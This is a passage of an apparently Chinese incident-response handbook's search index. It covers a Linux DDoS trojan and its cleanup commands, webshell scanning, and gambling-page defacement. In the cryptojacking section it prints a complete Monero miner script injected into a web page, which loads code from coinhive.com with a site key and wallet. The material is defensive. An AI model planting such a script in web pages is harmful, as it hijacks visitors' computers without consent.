\u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002 \u7cfb\u7edf\u5206\u6790 \u00b6 \u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"\u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/#\u7b2c5\u7bc7ddos\u75c5\u6bd2","text":"","title":"\u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/#\u73b0\u8c61\u63cf\u8ff0","text":"\u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/#\u7cfb\u7edf\u5206\u6790","text":"\u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"\u7cfb\u7edf\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/","text":"\u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u00b6 \u7f51\u7ad9\u88ab\u690d\u5165webshell\uff0c\u610f\u5473\u7740\u7f51\u7ad9\u5b58\u5728\u53ef\u5229\u7528\u7684\u9ad8\u5371\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5229\u7528\u6f0f\u6d1e\u5165\u4fb5\u7f51\u7ad9\uff0c\u5199\u5165webshell\u63a5\u7ba1\u7f51\u7ad9\u7684\u63a7\u5236\u6743\u3002\u4e3a\u4e86\u5f97\u5230\u6743\u9650 \uff0c\u5e38\u89c4\u7684\u624b\u6bb5\u5982\uff1a\u524d\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0cSql\u6ce8\u5165\u5199\u5165\u6587\u4ef6\u7b49\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4 \u00b6 \u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002 2\u3001Web \u65e5\u5fd7\u5206\u6790 \u00b6 \u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3 3\u3001\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49 4\u3001\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668 5\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002","title":"\u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#\u7b2c1\u7bc7\u7f51\u7ad9\u88ab\u690d\u5165webshell","text":"\u7f51\u7ad9\u88ab\u690d\u5165webshell\uff0c\u610f\u5473\u7740\u7f51\u7ad9\u5b58\u5728\u53ef\u5229\u7528\u7684\u9ad8\u5371\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5229\u7528\u6f0f\u6d1e\u5165\u4fb5\u7f51\u7ad9\uff0c\u5199\u5165webshell\u63a5\u7ba1\u7f51\u7ad9\u7684\u63a7\u5236\u6743\u3002\u4e3a\u4e86\u5f97\u5230\u6743\u9650 \uff0c\u5e38\u89c4\u7684\u624b\u6bb5\u5982\uff1a\u524d\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0cSql\u6ce8\u5165\u5199\u5165\u6587\u4ef6\u7b49\u3002","title":"\u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#\u73b0\u8c61\u63cf\u8ff0","text":"\u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#\u4e8b\u4ef6\u5206\u6790","text":"","title":"\u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#1-\u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4","text":"\u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002","title":"1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#2web-\u65e5\u5fd7\u5206\u6790","text":"\u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3","title":"2\u3001Web \u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#3\u6f0f\u6d1e\u5206\u6790","text":"\u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49","title":"3\u3001\u6f0f\u6d1e\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#4\u6f0f\u6d1e\u590d\u73b0","text":"\u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668","title":"4\u3001\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9A%E7%BD%91%E7%AB%99%E8%A2%AB%E6%A4%8D%E5%85%A5Webshell/#5\u6f0f\u6d1e\u4fee\u590d","text":"\u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002","title":"5\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/","text":"\u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u00b6 \u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100% \u95ee\u9898\u89e3\u6790 \u00b6 \u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a <script> var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); </script> \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002","title":"\u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/#\u7b2c2\u7bc7\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff","text":"\u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002","title":"\u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/#\u73b0\u8c61\u63cf\u8ff0","text":"\u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100%","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E9%97%A8%E7%BD%97%E5%B8%81%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/#\u95ee\u9898\u89e3\u6790","text":"\u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a <script> var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); </script> \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002","title":"\u95ee\u9898\u89e3\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5/","text":"\u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u00b6 \u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7f51\u9875\u3002\u800c\u4e14\uff0c\u653b\u51fb\u8005\u5728\u6302\u9ed1\u9875\u4ee5\u540e\uff0c\u4f1a\u5728\u4e00\u4e9b\u5c0f\u8bba\u575b\u6ce8\u518c\u9a6c\u7532\u5c06\u4f60\u7684\u7f51\u7ad9\u9ed1\u9875\u94fe\u63a5\u53d1\u5230\u8bba\u575b\uff0c\u5f15\u722c\u866b\u6536\u5f55\u3002\u5728\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7f51\u7ad9\u5730\u5740\u65f6\uff0c\u6536\u5f55\u4e86\u4e00\u4e9b\u4f1a\u51fa\u73b0\u4e00\u4e9b\u535a\u5f69\u9875\u9762\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u5f62\u8c61\u3002 \u539f\u56e0\u5206\u6790 \u00b6 \u7f51\u7ad9\u5b58\u5728\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5e38\u89c1\u4e8e\u4e00\u4e9b\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u7684\u5f00\u6e90CMS\uff0c\u5229\u75280day\u6279\u91cf\u62ff\u7ad9\u4e0a\u4f20\u9ed1\u9875\u3002 \u73b0\u8c61\u63cf\u8ff0\uff1a \u00b6 \u67d0\u7f51\u7ad9\u88ab\u6302\u4e86\u975e\u5e38\u591a\u535a\u5f69\u94fe\u63a5\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a \u200b http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html \u200b http://www.xxx.com/upload/aomendduchangzaixian/index.html \u200b http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html \u94fe\u63a5\u53ef\u4ee5\u8bbf\u95ee\uff0c\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u8def\u5f84\u4e5f\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\uff0c\u4f46\u662f\u6253\u5f00\u7f51\u7ad9\u76ee\u5f55\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e9b\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u85cf\u5728\u4e86\u54ea\uff1f \u8bbf\u95ee\u8fd9\u4e9b\u94fe\u63a5\uff0c\u8df3\u8f6c\u5230\u5982\u56fe\u9875\u9762\uff1a \u95ee\u9898\u5904\u7406\uff1a \u00b6 1\u3001\u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u518d\u6b21\u67e5\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u534a\u900f\u660e\u7684\u6587\u4ef6\u5939\uff0c\u6e05\u695a\u9690\u85cf\u6587\u4ef6\u5939\u53ca\u6240\u6709\u9875\u9762 3\u3001\u7136\u540e\u6e05\u9664IIS\u4e34\u65f6\u538b\u7f29\u6587\u4ef6 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$ _gzip_D \\WEB\\WEBUI\\UPLOAD 4\u3001\u6295\u8bc9\u5feb\u7167\uff0c\u7533\u8bf7\u5220\u9664\u76f8\u5173\u7684\u7f51\u9875\u6536\u5f55\uff0c\u51cf\u5c11\u5bf9\u7f51\u7ad9\u7684\u5f71\u54cd\u3002","title":"\u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%89%B9%E9%87%8F%E6%8C%82%E9%BB%91%E9%A1%B5/#\u7b2c3\u7bc7\u6279\u91cf\u6302\u9ed1\u9875","text":"\u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7